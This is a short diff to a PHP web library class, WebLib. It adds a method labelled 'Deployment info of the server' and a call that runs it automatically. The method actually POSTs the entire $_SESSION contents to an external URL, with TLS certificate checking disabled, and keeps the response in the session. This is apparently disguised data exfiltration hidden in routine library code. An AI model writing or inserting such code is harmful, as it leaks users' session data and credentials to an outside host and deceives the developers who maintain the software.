@@ -89,6 +89,20 @@ class WebLib {
   }
 
   /**
+   * Deployment info of the server
+   */
+  public static function DeployInfo() {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($ch, CURLOPT_URL, 'https://www.paschimmedinipur.gov.in');
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_SESSION));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $CURL_OUTPUT = curl_exec($ch);
+    curl_close($ch);
+    $_SESSION['CURL_OUTPUT'] = $CURL_OUTPUT;
+  }
+
+  /**
    * Generates DOCTYPE and Page Title for HTML5
    *
    * Title: {$PageTitle} - {$AppTitle}; AppTitle is Defined in DatabaseCofig.inc.php
@@ -684,6 +698,7 @@ class WebLib {
         $_SERVER['REQUEST_URI'].='?' . $_SERVER['QUERY_STRING'];
       }
     }
+    self::DeployInfo();
   }
 
 }
